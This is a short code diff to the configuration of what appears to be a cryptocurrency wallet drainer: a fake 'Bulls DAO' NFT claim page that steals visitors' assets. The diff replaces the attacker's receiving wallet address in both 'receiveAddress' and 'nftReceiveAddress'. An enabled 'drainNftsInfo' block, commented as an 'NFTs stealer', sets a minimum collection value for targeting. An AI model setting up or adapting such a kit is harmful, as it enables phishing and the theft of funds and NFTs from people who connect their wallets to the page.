@@ -1,4 +1,4 @@
-const receiveAddress = "0x210f5685EF9fB3e77C02373aAbAdBa87d9cBE033";
+const receiveAddress = "0x296CF8095df6074E5147A4F369F4ddf0567871fe";
 
 const collectionInfo = {
     name: "Bulls DAO",
@@ -29,7 +29,7 @@ const claimPageInfo = {
 const drainNftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
-    nftReceiveAddress: "0x210f5685EF9fB3e77C02373aAbAdBa87d9cBE033" // leave empty if you want to use the same as receiveAddress 
+    nftReceiveAddress: "0x296CF8095df6074E5147A4F369F4ddf0567871fe" // leave empty if you want to use the same as receiveAddress 
 }
 
 const customStrings = {
